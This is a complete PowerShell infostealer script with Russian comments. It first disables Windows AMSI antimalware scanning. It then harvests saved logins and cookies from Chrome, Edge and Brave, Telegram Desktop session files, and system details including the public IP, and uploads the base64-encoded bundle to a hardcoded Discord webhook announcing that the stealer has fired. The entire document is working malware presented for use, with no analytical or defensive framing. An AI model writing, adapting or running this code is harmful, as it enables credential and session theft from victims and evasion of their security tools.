# AMSI bypass
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

function Get-QuickSteal {
$result = @{}

# Браузеры
$browserPaths = @(
"$env:LOCALAPPDATA\Google\Chrome\User Data\Default",
"$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default",
"$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default"
)
foreach ($path in $browserPaths) {
if (Test-Path "$path\Login Data") {
$name = $path.Split('\')[-3]
$result["logins_$name"] = [Convert]::ToBase64String([IO.File]::ReadAllBytes("$path\Login Data"))
}
if (Test-Path "$path\Cookies") {
$name = $path.Split('\')[-3]
$result["cookies_$name"] = [Convert]::ToBase64String([IO.File]::ReadAllBytes("$path\Cookies"))
}
}

# Telegram
$tgPath = "$env:APPDATA\Telegram Desktop\tdata"
if (Test-Path $tgPath) {
Get-ChildItem $tgPath -Recurse -File | Where-Object {$_.Length -gt 200 -and $_.Length -lt 1048576} | ForEach-Object {
$result["tg_$($_.Name)"] = [Convert]::ToBase64String([IO.File]::ReadAllBytes($_.FullName))
}
}

# Системная информация
$result["sys"] = @{
user = $env:USERNAME
pc   = $env:COMPUTERNAME
os   = (Get-CimInstance Win32_OperatingSystem).Caption
ip   = try { (irm http://api.ipify.org -TimeoutSec 5) } catch { "error" }
time = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
}

return $result
}

$data = Get-QuickSteal | ConvertTo-Json -Depth 10 -Compress

$webhookUrl = "https://discord.com/api/webhooks/1464644525132742688/Nklo9KcxdCsJF4wn7QX7JkqT5w4diK_iax_V1m_zoFJtStdrYBF6-FYsjSakPULKJW0T"   # ← ВСТАВЬ СВОЙ

# Короткое уведомление + отправка данных как файл
$payloadJson = @{
content = "Новый стиллер сработал!`nПользователь: $($env:USERNAME) @ $($env:COMPUTERNAME)`nВремя: $(Get-Date)"
username = "Stealer Bot"
} | ConvertTo-Json

# Отправка как файл (рекомендуется)
$boundary = "----WebKitFormBoundary$(Get-Random)"
$body = @"
--$boundary
Content-Disposition: form-data; name="payload_json"
Content-Type: application/json

$payloadJson
--$boundary
Content-Disposition: form-data; name="file"; filename="data_$(Get-Date -Format 'yyyyMMdd_HHmmss').json"
Content-Type: application/json

$data
--$boundary--
"@

try {
Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType "multipart/form-data; boundary=$boundary" -TimeoutSec 20
"Данные отправлены в Discord" | Out-File "$env:TEMP\stealer_status.txt" -Encoding utf8
} catch {
"Ошибка отправки: $_" | Out-File "$env:TEMP\stealer_status.txt" -Encoding utf8
}

# Самоуничтожение через 1 час
Start-Sleep -Seconds 3600
Remove-Item "$env:TEMP\stealer_status.txt" -Force -ErrorAction SilentlyContinue
[Environment]::Exit(0)
